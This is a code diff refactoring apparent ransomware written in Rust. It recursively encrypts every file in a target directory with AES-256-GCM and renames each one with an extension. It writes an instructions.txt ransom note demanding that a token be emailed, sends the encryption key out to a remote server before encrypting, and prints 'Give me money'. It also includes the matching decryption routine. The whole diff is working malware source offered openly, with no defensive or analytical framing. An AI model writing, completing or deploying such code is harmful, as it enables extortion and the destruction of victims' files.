@@ -23,36 +23,93 @@ impl<'a> Key<'a>{
         let key = LessSafeKey::new(UnboundKey::new(&AES_256_GCM, &vec).unwrap());
         Key{key, vec: vec.try_into().expect("Error reading key"), dir}
     }
+
+    fn from_dir(dir: &'a str) -> Result<Self, std::io::Error>{
+        let msg = "Error parsing key!";
+        let content = fs::read_to_string(dir)?;
+        let key: Vec<u8> = content.split(" ")
+            .into_iter()
+            .map(|i| i
+                .parse()
+                .expect(msg))
+            .collect();
+
+        Ok(Key::from(key, dir))
+    }
+}
+
+struct Actions{
+    inst: fn(&str, Option<&str>) -> Result<(), std::io::Error>,
+    function: fn(&Key, &mut Vec<u8>),
+    valid: fn(&str, (&str, &str, &str)) -> bool,
+    rename: fn(&str) -> Result<(), std::io::Error>
+}
+
+impl Actions{
+    fn for_encryption() -> Self{
+        Actions{
+            inst: write_inst,
+            function: encrypt,
+            valid: valid_enc,
+            rename: add_ext
+        }
+    }
+
+    fn for_decryption() -> Self{
+        Actions{
+            inst: rem_inst,
+            function: decrypt,
+            valid: valid_dec,
+            rename: rem_ext
+        }
+    }
 }
 
 fn get_self_dir() -> String{
     std::env::current_exe()
-        .map(|d| d.to_str().unwrap().to_owned())
+        .map(|d| d
+            .to_str()
+            .unwrap()
+            .to_owned())
         .unwrap()
 }
 
-fn read_key(dir: &str) -> Result<Key, std::io::Error>{
-    let msg = "Error reading file!";
-    let content = fs::read_to_string(dir)?;
-    let key: Vec<u8> = content.split(" ")
-        .into_iter()
-        .map(|i| i.parse().expect(msg))
-        .collect();
-
-    Ok(Key::from(key, dir))
-}
-
 fn valid_enc(path: &str, exceptions: (&str, &str, &str)) -> bool{
-    !path.ends_with(EXT) && path != exceptions.0 && path != exceptions.1 && path != exceptions.2
+    !path.ends_with(EXT) && 
+    path != exceptions.0 && 
+    path != exceptions.1 && 
+    path != exceptions.2
 }
 
 fn valid_dec(path: &str, exceptions: (&str, &str, &str)) -> bool{
-    path.ends_with(EXT) && path != exceptions.0 && path != exceptions.1 && path != exceptions.2
+     path.ends_with(EXT) && 
+    path != exceptions.0 && 
+    path != exceptions.1 && 
+    path != exceptions.2
 }
 
-fn write_instructions(token: &str, dir: &str) -> Result<(), std::io::Error>{
+fn add_ext(file: &str) -> Result<(), std::io::Error>{
+    let new_name = String::from(file) + EXT;
+    fs::rename(file, new_name)
+}
+
+fn rem_ext(file: &str) -> Result<(), std::io::Error>{
+    let new_name = String::from(&file[..file.len() - EXT.len()]);
+    fs::rename(file, new_name)
+}
+
+fn rem_inst(dir: &str, _: Option<&str>) -> Result<(), std::io::Error>{
+    fs::remove_file(dir)
+}
+
+fn write_inst(dir: &str, token: Option<&str>) -> Result<(), std::io::Error>{
     let email = "asd@asd.com";
-    let instructions = format!("to get your files back, send the following token to {}:\n{}", email, token);
+    let mut instructions = String::new();
+
+    instructions += "to get your files back, send the following token to ";
+    instructions += email;
+    instructions += ":\n";
+    instructions += token.unwrap();
 
     fs::write(dir, instructions)
 }
@@ -76,56 +133,30 @@ fn encrypt(k: &Key, data: &mut Vec<u8>){
 }
 
 fn decrypt(k: &Key, data: &mut Vec<u8>){
-    let iv: Vec<u8> = data.drain(data.len() - 12..data.len()).collect();
+    let iv: Vec<u8> = data.drain(data.len() - 12..).collect();
     let nonce = Nonce::assume_unique_for_key(iv.try_into().expect("Error"));
     k.key.open_in_place(nonce, Aad::empty(), data).unwrap();
     data.truncate(data.len() - AES_256_GCM.tag_len());
 }
 
-fn encrypt_files(k: &Key, self_dir: &str, dir: &str, token: &str) -> Result<(), std::io::Error>{
+fn run_virus(k: &Key, act: &Actions, self_dir: &str, dir: &str, token: Option<&str>) -> Result<(), std::io::Error>{
     let paths = fs::read_dir(dir)?;
     let inst_path = format!("{}/instructions.txt", dir);
-    let _ = write_instructions(token, &inst_path);
+    let _ = (act.inst)(&inst_path, token);
     
     for path in paths{
         let path = path.unwrap().path();
         let path = path.as_path();
         let path_str = path.to_str().unwrap();
-        
-        if path.is_file() && valid_enc(path_str, (k.dir, &inst_path, self_dir)){
+
+        if path.is_file() && (act.valid)(&path_str, (k.dir, &inst_path, self_dir)){
             if let Ok(mut content) = fs::read(path){
-                encrypt(&k, &mut content);
+                (act.function)(&k, &mut content);
                 let _ = fs::write(&path, content);
-                let _ = fs::rename(&path, format!("{}{}", path_str, EXT));
+                (act.rename)(path_str)?
             }
         }else if path.is_dir(){
-            encrypt_files(k, self_dir, path_str, token)?
-        }
-    }
-
-    Ok(())
-}
-
-fn decrypt_files(k: &Key, self_dir: &str, dir: &str) -> Result<(), std::io::Error>{
-    let paths = fs::read_dir(dir)?;
-    let inst_path = format!("{}/instructions.txt", dir);
-    let _ = fs::remove_file(&inst_path);
-    
-    for path in paths{
-        let path = path.unwrap().path();
-        let path = path.as_path();
-        let mut path_str = String::from(path.to_str().unwrap());
-
-        if path.is_file() && valid_dec(&path_str, (k.dir, &inst_path, self_dir)){
-            if let Ok(mut content) = fs::read(path){
-                decrypt(&k, &mut content);
-                let _ = fs::write(&path, content);
-
-                path_str.truncate(path_str.len() - EXT.len());
-                let _ = fs::rename(&path, path_str);
-            }
-        }else if path.is_dir(){
-            decrypt_files(&k, self_dir, &path_str)?
+            run_virus(&k, act, self_dir, &path_str, token)?
         }
     }
 
@@ -137,16 +168,18 @@ pub fn run(target: &str, key_dir: Option<&str>) -> Result<(), std::io::Error>{
     
     match key_dir{
         Some(dir) => {
-            let k = read_key(dir)?;
-            decrypt_files(&k, &self_dir, target)?;
+            let k = Key::from_dir(dir)?;
+            let act = Actions::for_decryption();
+            run_virus(&k, &act, &self_dir, target, None)?;
             println!("Files restored!");
         },
         None => {
-            let token = generate_token();
             let k = Key::new();
+            let token = generate_token();
+            let act = Actions::for_encryption();
 
             if let Ok(_) = req::stash_key(&token, &mut Vec::from(k.vec)){
-                encrypt_files(&k, &self_dir, target, &token)?;
+                run_virus(&k, &act, &self_dir, target, Some(&token))?;
                 println!("Give me money");
             }
         }
